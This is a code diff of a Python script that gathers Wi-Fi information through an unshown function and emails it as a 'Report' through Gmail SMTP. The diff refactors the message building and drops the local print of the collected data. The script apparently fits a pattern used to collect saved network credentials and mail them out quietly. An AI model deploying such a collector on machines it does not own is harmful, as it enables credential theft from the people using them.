@@ -10,13 +10,20 @@ import chardet
 
 # https://myaccount.google.com/lesssecureapps
 
+def get_mime_text(plain_msg, subject, sender, recipients):
+    mime_msg = MIMEText(plain_msg, 'plain', 'utf-8')
+    mime_msg['Subject'] = Header(subject, 'utf-8')
+    mime_msg['From'] = sender
+    mime_msg['To'] = recipients
+    return mime_msg
 
-def send_mail(email, psw, msg):
+
+def send_mail(mime_msg, psw):
     server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
     try:
         server.starttls()
-        server.login(email, psw)
-        server.sendmail(email, email, msg)
+        server.login(mime_msg['From'], psw)
+        server.sendmail(mime_msg['From'], mime_msg['To'], mime_msg.as_string())
     finally:
         server.quit()
 
@@ -35,15 +42,11 @@ def get_wifi_info():
     return result
 
 
-msg = get_wifi_info()
-print(msg)
+plain_msg = get_wifi_info()
 login = "xxx@gmail.com"
 psw = ""
 recipients_emails = login
 
-msg = MIMEText(msg, 'plain', 'utf-8')
-msg['Subject'] = Header('Report', 'utf-8')
-msg['From'] = login
-msg['To'] = recipients_emails
+mime_msg = get_mime_text(plain_msg, "Report", login, login)
 
-send_mail(msg['From'], psw, msg.as_string())
+send_mail(mime_msg, psw)
